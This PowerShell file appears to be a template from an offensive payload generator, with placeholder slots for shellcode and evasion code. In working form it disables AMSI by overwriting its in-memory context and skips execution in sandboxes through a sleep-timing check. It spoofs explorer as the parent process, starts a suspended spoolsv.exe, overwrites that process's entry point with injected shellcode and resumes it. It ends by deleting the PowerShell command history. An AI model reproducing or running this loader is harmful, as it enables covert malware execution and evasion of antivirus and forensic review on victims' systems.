//####CODE####

function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
 Param (
 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
 [Parameter(Position = 1)] [Type] $delType = [Void]
 )
 $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
 $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
 $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
 return $type.CreateType()
}


$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);if($ptr -ne 0){[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)}
$starttime = Get-Date -Displayhint Time
Start-sleep -s 5
$finishtime = Get-Date -Displayhint Time
if ( $finishtime -le $starttime.addseconds(4.5) ) {
 exit
}

//####EVASION####

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
public struct STARTUPINFO
{
    public uint cb;
    public IntPtr lpReserved;
    public IntPtr lpDesktop;
    public IntPtr lpTitle;
    public uint dwX;
    public uint dwY;
    public uint dwXSize;
    public uint dwYSize;
    public uint dwXCountChars;
    public uint dwYCountChars;
    public uint dwFillAttributes;
    public uint dwFlags;
    public ushort wShowWindow;
    public ushort cbReserved;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdErr;
}
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public int dwProcessId;
    public int dwThreadId;
}
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_BASIC_INFORMATION
{
    public IntPtr Reserved1;
    public IntPtr PebAddress;
    public IntPtr Reserved2;
    public IntPtr Reserved3;
    public IntPtr UniquePid;
    public IntPtr MoreReserved;
}

[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFOEX
{
    public STARTUPINFO StartupInfo;
    public IntPtr lpAttributeList;
}

[StructLayout(LayoutKind.Sequential)]
public struct SECURITY_ATTRIBUTES
{
    public int nLength;
    public IntPtr lpSecurityDescriptor;
    public int bInheritHandle;
}

public class Kernel32 {
	[DllImport("kernel32.dll", SetLastError=true)] public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,  ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,  uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
}
"@

$startInfoEx = New-Object STARTUPINFOEX
$startInfo = New-Object STARTUPINFO
$pi = New-Object PROCESS_INFORMATION
$startInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($startInfoEx)
$startInfoEx.StartupInfo = $startInfo
$lpValue = [System.Runtime.InteropServices.Marshal]::AllocHglobal([IntPtr]::Size)
$processSecurity = New-Object SECURITY_ATTRIBUTES
$threadSecurity = New-Object SECURITY_ATTRIBUTES
$processSecurity.nLength = [System.Runtime.InteropServices.Marshal]::SizeOf($processSecurity)
$threadSecurity.nLength = [System.Runtime.InteropServices.Marshal]::SizeOf($threadSecurity)
$lpSize = [IntPtr]::Zero
$bi = New-Object PROCESS_BASIC_INFORMATION

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll InitializeProcThreadAttributeList), (getDelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType())([bool]))).Invoke([IntPtr]::Zero, 2, 0, [ref]$lpSize)

$startInfoEx.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($lpSize)

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll InitializeProcThreadAttributeList), (getDelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType())([bool]))).Invoke($startInfoEx.lpAttributeList, 2, 0, [ref]$lpSize)

[System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValue, 0x300000000000)
$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll UpdateProcThreadAttribute), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr])([bool]))).Invoke($startInfoEx.lpAttributeList, 0, 0x20007, $lpValue, [IntPtr]::Size, [IntPtr]::Zero, [IntPtr]::Zero)

$procid=(get-process explorer)[0].id
$hprocess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, $false, $procid)

$lpValue = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValue, $hprocess)

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll UpdateProcThreadAttribute), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr])([bool]))).Invoke($startInfoEx.lpAttributeList, 0, 0x00020000, $lpValue, [IntPtr]::Size, [IntPtr]::Zero, [IntPtr]::Zero)

$tw = [Kernel32]::CreateProcess("C:\Windows\system32\spoolsv.exe", $null, [ref]$processSecurity, [ref]$threadSecurity, $false, 0x00080004, [IntPtr]::Zero, "c:", [ref]$startInfoEx, [ref]$pi) 

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll DeleteProcThreadAttributeList), (getDelegateType @([IntPtr])([bool]))).Invoke($startInfoEx.lpAttributeList)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($startInfoEx.lpAttributeList)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($lpValue)

$hProcess = $pi.hProcess

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc ntdll.dll ZwQueryInformationProcess), (getDelegateType @([IntPtr], [UInt32], [PROCESS_BASIC_INFORMATION].MakeByRefType(), [UInt32], [UInt32])([UInt32]))).Invoke($hProcess, 0, [ref]$bi, ([IntPtr]::Size * 6), $tmp)

[IntPtr]$ptrToImageBase = [int64]$bi.PebAddress + 0x10
$addrBuf = New-Object byte[]([IntPtr]::Size)
[IntPtr]$nRead = [IntPtr]::Zero

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ReadProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [byte[]], [UInt32], [IntPtr].MakeByRefType())([bool]))).Invoke($hProcess, $ptrToImageBase, $addrBuf, $addrBuf.length, [ref]$nRead)

$svchostBase = [bitconverter]::ToInt64($addrBuf,0)
$data = New-Object byte[](0x200)
$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ReadProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [byte[]], [UInt32], [IntPtr].MakeByRefType())([bool]))).Invoke($hProcess, $svchostBase, $data, $data.length, [ref]$nRead)
[uint32]$e_lfanew_offset = [BitConverter]::ToUInt32($data, 0x3C);
[uint32]$opthdr = $e_lfanew_offset + 0x28;
[uint32]$entrypoint_rva = [BitConverter]::ToUInt32($data, [int]$opthdr);
[UIntPtr]$addressOfEntryPoint = [UIntPtr]($entrypoint_rva + [UInt64]$svchostBase);
[Int32]$lpNumberOfBytesWritten = 0


[Byte[]] $buf = ####SHELLCODE####

//####CALL####

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [UIntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType())([bool]))).Invoke($hprocess, $addressOfEntryPoint, $buf, $buf.length, [ref]$lpNumberOfBytesWritten)
$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ResumeThread), (getDelegateType @([IntPtr])([IntPtr]))).Invoke($pi.hThread)
Remove-Item "$Env:APPDATA\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue